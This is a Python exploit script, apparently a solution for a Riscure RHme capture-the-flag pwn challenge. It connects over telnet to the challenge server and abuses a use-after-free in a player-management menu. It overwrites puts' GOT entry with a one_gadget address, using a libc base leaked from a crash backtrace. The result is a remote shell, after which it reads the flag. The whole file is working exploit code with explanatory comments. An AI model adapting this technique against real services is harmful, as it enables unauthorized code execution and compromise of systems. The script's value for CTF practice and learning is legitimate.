import struct

import telnetlib


HOST = "localhost"
PORT = "1337"
REMOTE = True
if REMOTE:
    HOST = "pwn.rhme.riscure.com"
    PORT = "1337"

tn = telnetlib.Telnet(HOST,PORT)

def get_menu():
    print(tn.read_until(match=b"Your choice: ", timeout=1))

def add_playa(name: bytes, attack: bytes, defense: bytes, speed: bytes, precision: bytes):
    tn.write(b"1\n")
    print(tn.read_until(match=b"Found free slot: "))
    tn.write(name+b"\n")
    print(tn.read_until(match=b"Enter attack points: "))
    tn.write(attack+b"\n")
    print(tn.read_until(match=b"Enter defense points: "))
    tn.write(defense+b"1\n")
    print(tn.read_until(match=b"Enter speed: "))
    tn.write(speed+b"1\n")
    print(tn.read_until(match=b"Enter precision: "))
    tn.write(precision+b"1\n")
    get_menu()

def select_player(player_index: bytes):
    tn.write(b"3\n")
    print(tn.read_until(match=b"Enter index: "))
    tn.write(player_index+b"\n")
    get_menu()

def delete_player(player_index: bytes):
    tn.write(b"2\n")
    print(tn.read_until(match=b"Enter index: "))
    tn.write(player_index+b"\n")
    get_menu()

def show_player():
    tn.write(b"5\n")
    get_menu()

def edit_name(new_name: bytes):
    tn.write(b"4\n")
    get_menu()
    tn.write(b"1\n")
    print(tn.read_until(b"Enter new name: "))
    tn.write(new_name+b"\n")
    get_menu()
    tn.write(b"0\n")
    get_menu()

get_menu()
add_playa(b"A"*0x50, b"1", b"1", b"1", b"1")
# I want malloc to be called presisely with 0x18 bytes - malloc(0x17+0x1) (0x1 for null byte at the end of c string)
# 0x18 because sizeof(struct Player) == 0x18
add_playa(b"B"*0x17, b"1", b"1", b"1", b"1")

select_player(b"1")
delete_player(b"1")
delete_player(b"0")
PUTS_ADDR=b"\x60\x30\x30"[::-1]
add_playa(b"C"*0x10+PUTS_ADDR, b"7", b"7", b"7", b"7")
# input()

if not REMOTE:
    LIBC_BASE = 0x7f5ce1c37000
    # one_gadget /lib/x86_64-linux-gnu/libc-2.24.so
    ONE_SHOT_OFFSET = [0x3f33a,0xb8abf,0xd6845]


if REMOTE:
    # i know thier LIBC_BASE because while setting ONE_SHOT_ADDR to something stupid that would make no sense and crash the app
    # i got this pretty error (ONE_SHOT_ADDR = b'j\xc2\xdd\xff\xb9\x7f' (there can't be any zeros in ONE_SHOT_ADDR)):
    # *** Error in `/opt/riscure/pwn/main.elf': realloc(): invalid old size: 0x0000000000603030 ***
    # ======= Backtrace: =========
    # /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f36a9cc87e5]
    # /lib/x86_64-linux-gnu/libc.so.6(+0x834aa)[0x7f36a9cd44aa]
    # /lib/x86_64-linux-gnu/libc.so.6(+0x85ba9)[0x7f36a9cd6ba9]
    # /lib/x86_64-linux-gnu/libc.so.6(realloc+0x22f)[0x7f36a9cd58ef]
    # /opt/riscure/pwn/main.elf[0x401d7b]
    # /opt/riscure/pwn/main.elf[0x40205d]
    # /opt/riscure/pwn/main.elf[0x40225e]
    # /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f36a9c71830]
    # /opt/riscure/pwn/main.elf[0x400ee9]
    # ======= Memory map: ========
    # 00400000-00403000 r-xp 00000000 ca:01 269727                             /opt/riscure/pwn/main.elf
    # 00602000-00603000 r--p 00002000 ca:01 269727                             /opt/riscure/pwn/main.elf
    # 00603000-00604000 rw-p 00003000 ca:01 269727                             /opt/riscure/pwn/main.elf
    # 00643000-00664000 rw-p 00000000 00:00 0                                  [heap]
    # 7f36a4000000-7f36a4021000 rw-p 00000000 00:00 0
    # 7f36a4021000-7f36a8000000 ---p 00000000 00:00 0
    # 7f36a91fb000-7f36a9211000 r-xp 00000000 ca:01 2038                       /lib/x86_64-linux-gnu/libgcc_s.so.1
    # 7f36a9211000-7f36a9410000 ---p 00016000 ca:01 2038                       /lib/x86_64-linux-gnu/libgcc_s.so.1
    # 7f36a9410000-7f36a9411000 rw-p 00015000 ca:01 2038                       /lib/x86_64-linux-gnu/libgcc_s.so.1
    # 7f36a9411000-7f36a941c000 r-xp 00000000 ca:01 4298                       /lib/x86_64-linux-gnu/libnss_files-2.23.so
    # 7f36a941c000-7f36a961b000 ---p 0000b000 ca:01 4298                       /lib/x86_64-linux-gnu/libnss_files-2.23.so
    # 7f36a961b000-7f36a961c000 r--p 0000a000 ca:01 4298                       /lib/x86_64-linux-gnu/libnss_files-2.23.so
    # 7f36a961c000-7f36a961d000 rw-p 0000b000 ca:01 4298                       /lib/x86_64-linux-gnu/libnss_files-2.23.so
    # 7f36a961d000-7f36a9623000 rw-p 00000000 00:00 0
    # 7f36a9623000-7f36a962e000 r-xp 00000000 ca:01 4302                       /lib/x86_64-linux-gnu/libnss_nis-2.23.so
    # 7f36a962e000-7f36a982d000 ---p 0000b000 ca:01 4302                       /lib/x86_64-linux-gnu/libnss_nis-2.23.so
    # 7f36a982d000-7f36a982e000 r--p 0000a000 ca:01 4302                       /lib/x86_64-linux-gnu/libnss_nis-2.23.so
    # 7f36a982e000-7f36a982f000 rw-p 0000b000 ca:01 4302                       /lib/x86_64-linux-gnu/libnss_nis-2.23.so
    # 7f36a982f000-7f36a9845000 r-xp 00000000 ca:01 4277                       /lib/x86_64-linux-gnu/libnsl-2.23.so
    # 7f36a9845000-7f36a9a44000 ---p 00016000 ca:01 4277                       /lib/x86_64-linux-gnu/libnsl-2.23.so
    # 7f36a9a44000-7f36a9a45000 r--p 00015000 ca:01 4277                       /lib/x86_64-linux-gnu/libnsl-2.23.so
    # 7f36a9a45000-7f36a9a46000 rw-p 00016000 ca:01 4277                       /lib/x86_64-linux-gnu/libnsl-2.23.so
    # 7f36a9a46000-7f36a9a48000 rw-p 00000000 00:00 0
    # 7f36a9a48000-7f36a9a50000 r-xp 00000000 ca:01 4574                       /lib/x86_64-linux-gnu/libnss_compat-2.23.so
    # 7f36a9a50000-7f36a9c4f000 ---p 00008000 ca:01 4574                       /lib/x86_64-linux-gnu/libnss_compat-2.23.so
    # 7f36a9c4f000-7f36a9c50000 r--p 00007000 ca:01 4574                       /lib/x86_64-linux-gnu/libnss_compat-2.23.so
    # 7f36a9c50000-7f36a9c51000 rw-p 00008000 ca:01 4574                       /lib/x86_64-linux-gnu/libnss_compat-2.23.so
    # 7f36a9c51000-7f36a9e11000 r-xp 00000000 ca:01 4607                       /lib/x86_64-linux-gnu/libc-2.23.so
    # 7f36a9e11000-7f36aa011000 ---p 001c0000 ca:01 4607                       /lib/x86_64-linux-gnu/libc-2.23.so
    # 7f36aa011000-7f36aa015000 r--p 001c0000 ca:01 4607                       /lib/x86_64-linux-gnu/libc-2.23.so
    # 7f36aa015000-7f36aa017000 rw-p 001c4000 ca:01 4607                       /lib/x86_64-linux-gnu/libc-2.23.so
    # 7f36aa017000-7f36aa01b000 rw-p 00000000 00:00 0
    # 7f36aa01b000-7f36aa041000 r-xp 00000000 ca:01 4279                       /lib/x86_64-linux-gnu/ld-2.23.so
    # 7f36aa234000-7f36aa237000 rw-p 00000000 00:00 0
    # 7f36aa23d000-7f36aa23e000 rw-p 00000000 00:00 0
    # 7f36aa23e000-7f36aa240000 rw-p 00000000 00:00 0
    # 7f36aa240000-7f36aa241000 r--p 00025000 ca:01 4279                       /lib/x86_64-linux-gnu/ld-2.23.so
    # 7f36aa241000-7f36aa242000 rw-p 00026000 ca:01 4279                       /lib/x86_64-linux-gnu/ld-2.23.so
    # 7f36aa242000-7f36aa243000 rw-p 00000000 00:00 0
    # 7ffed8845000-7ffed8866000 rw-p 00000000 00:00 0                          [stack]
    # 7ffed89bb000-7ffed89bd000 r--p 00000000 00:00 0                          [vvar]
    # 7ffed89bd000-7ffed89bf000 r-xp 00000000 00:00 0                          [vdso]
    # ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
    #

    LIBC_BASE = 0x7f36a9c51000 # 7f36a9c51000-7f36a9e11000 r-xp 00000000 ca:01 4607                       /lib/x86_64-linux-gnu/libc-2.23.so
    # one_gadget for their libc
    ONE_SHOT_OFFSET=[0x4526a,0xcd0f3,0xcd1c8,0xf0274,0xf1117,0xf66c0]

# I tried all and one worked
ONE_SHOT_OFFSET=ONE_SHOT_OFFSET[4]

ONE_SHOT_ADDR = struct.pack("L", LIBC_BASE+ONE_SHOT_OFFSET)[:-2] # -2 bc we don't want to send 0s

print("trying to set: ", ONE_SHOT_ADDR)
edit_name(ONE_SHOT_ADDR)
print(tn.read_until(match=b"\n", timeout=1))
tn.write(b"ls\n")
print(tn.read_until(match=b"\n", timeout=1))
print(tn.read_until(match=b"\n", timeout=1))
tn.write(b"cat flag\n")
print(tn.read_until(match=b"\n", timeout=1))
tn.interact()
